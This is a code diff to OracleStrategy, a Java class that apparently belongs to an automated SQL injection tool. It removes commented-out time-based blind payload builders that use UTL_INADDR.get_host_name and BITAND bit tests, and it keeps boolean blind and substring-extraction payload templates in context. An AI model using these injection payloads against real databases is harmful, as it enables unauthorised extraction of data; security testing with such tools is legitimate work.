@@ -136,21 +136,6 @@ public class OracleStrategy extends ASQLStrategy {
         return "+and+length(" + inj + ")>" + indexCharacter + "--+";
     }
 
-//    @Override
-//    public String timeCheck(String check) {
-//        return "+union+select+CASE+WHEN+" + check + "+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
-//    }
-//
-//    @Override
-//    public String timeBitTest(String inj, int indexCharacter, int bit) {
-//        return "+union+select+CASE+WHEN+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
-//    }
-//
-//    @Override
-//    public String timeLengthTest(String inj, int indexCharacter) {
-//        return "+union+select+CASE+WHEN+length(" + inj + ")>" + indexCharacter + "+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
-//    }
-
     @Override
     public String blindStrategy(String sqlQuery, String startPosition) {
         return
@@ -166,22 +151,6 @@ public class OracleStrategy extends ASQLStrategy {
                 "" +
             ")";
     }
-
-//    @Override
-//    public String timeStrategy(String sqlQuery, String startPosition) {
-//        return
-//            "(" +
-//                "select+" +
-//                    "" +
-//                        "'SQLi'||" +
-//                        "substr(" +
-//                            "(" + sqlQuery + ")," +
-//                            startPosition + "," +
-//                            MediatorModel.model().performanceLength +
-//                        ")from+dual" +
-//                    "" +
-//            ")";
-//    }
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
